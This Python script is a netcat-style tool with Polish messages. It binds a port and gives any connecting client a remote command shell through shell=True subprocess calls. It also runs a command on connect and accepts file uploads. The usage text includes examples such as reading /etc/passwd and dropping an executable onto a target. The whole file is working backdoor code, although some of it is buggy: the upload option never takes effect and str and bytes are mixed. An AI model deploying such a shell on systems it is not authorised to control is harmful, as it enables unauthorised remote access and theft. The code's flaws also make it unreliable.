# -*- coding: utf-8 -*-
# !/opt/local/bin/python3

import sys
import socket
import getopt
import threading
import subprocess
import pdb


class First:
    def __init__(self):
        self.listen: bool = False
        self.command: bool = False
        self.upload: bool = False
        self.execute: str = ""
        self.target: str = ""
        self.upload_destination: str = ""
        self.port: int = 0

    def run_command(self, command: bytes):
        command = command.decode('utf8').rstrip()

        try:
            output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
        except:
            output = "Nie udalo się wykonac polecenia.\r\n"

        return output

    def client_handler(self, client_socket):
        print('Polaczenie', self, client_socket, file=sys.stderr)
        if len(self.upload_destination):

            file_buffer = ""

            while True:
                data = client_socket.recv(1024)

                if not data:
                    break
                else:
                    file_buffer += data

            try:
                file_descriptor = open(self.upload_destination, "wb")
                file_descriptor.write(file_buffer)
                file_descriptor.close()

                client_socket.send(("Zapisano plik w %s\r\n" % (self.upload_destination,)).encode('utf8'))
            except:
                client_socket.send(("Nie udalo się zapisac pliku w %s\r\n" % (self.upload_destination,)).encode('utf8'))

        if len(self.execute):
            output = self.run_command(self.execute)

            client_socket.send(output.encode('utf8'))

        if self.command:

            while True:

                client_socket.send(b"<FIRST:#> ")

                cmd_buffer = b""
                while b"\n" not in cmd_buffer:
                    cmd_buffer += client_socket.recv(1024)

                response = self.run_command(cmd_buffer)

                client_socket.send(response)

    def server_loop(self):

        if not len(self.target):
            self.target = "0.0.0.0"

        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.target, self.port))

        server.listen(5)

        while True:
            client_socket, addr = server.accept()
            print('Accepting %s from %s' % (client_socket, addr))
            client_thread = threading.Thread(target=First.client_handler, args=(self, client_socket,))
            client_thread.start()

    def client_sender(self, buffer: str):
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        try:
            client.connect((self.target, self.port))
            print("Connect to:", self.target, "\n" + "On port:", self.port)
            if len(buffer):
                client.send(buffer.encode('utf8'))

            while True:

                recv_len = 1
                response = b""

                while recv_len:
                    data = client.recv(4096)
                    recv_len = len(data)
                    response += data

                    if recv_len < 4096:
                        break

                print(response.decode('utf8')),

                buffer = input("")
                buffer += "\n"

                client.send(buffer.encode('utf8'))


        except:
            print("\n" + "Lost Connection!", "\n" + "Error: Wyjatek[*]")
            client.close()

    def main(self):
        if not len(sys.argv[1:]):
            self.usage()

        try:
            opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:",
                                       ["help", "listen", "execute", "target", "port", "command", "upload"])
        except getopt.GetoptError as err:
            self.usage()

        for o, a in opts:
            if o in ("-h", "--help"):
                self.usage()
            elif o in ("-l", "--listen"):
                self.listen = True
            elif o in ("-e", "--execute"):
                self.execute = a
            elif o in ("-c", "--commandshell"):
                self.command = True
            elif o in ("-u", "--upload"):
                upload_destination = a
            elif o in ("-t", "--target"):
                self.target = a
            elif o in ("-p", "--port"):
                self.port = int(a)
            else:
                assert False, "Nieobslugiwana opcja"

        if not self.listen and len(self.target) and self.port > 0:
            buffer = sys.stdin.readline()

            self.client_sender(buffer)

        if self.listen:
            self.server_loop()

    def usage(self):
        print("""
    Sposob uzycia: FIRST.py -t target_host -p port
    -l --listen                - nasluchuje na [host]:[port] przychodzacych polaczen
    -e --execute=file_to_run   - wykonuje dany plik, gdy zostanie nawiązanie połaczenie
    -c --command               - inicjuje wiersz polecen
    -u --upload=destination    - po nawiazaniu polaczenia wysyła plik i zapisuje go w [destination]
    -t -target                  - adres ip
    Przyklady: 
    first.py -t 192.168.0.1 -p 5555 -l -c
    first.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe
    first.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\
    echo 'ABCDEFGHI' | ./first.py -t 192.168.11.12 -p 135
    Rozpoczecie nasluchiwania:
    python3 FIRST.py -l -p 1234 -c
    Nawiazywanie polaczenia z nasluchujacym komputerem:
    python3 FIRST.py -t 192.168.0.1 -p 1234 

    Ewentualnie:
    Rozpoczecie nasluchiwania:
    python FIRST.py -l -p 1234 -c
    Nawiazywanie polaczenia z nasluchujacym komputerem:
    python FIRST.py -t 192.168.0.1 -p 1234 

    """)
        sys.exit(0)


if __name__ == '__main__':
    First().main()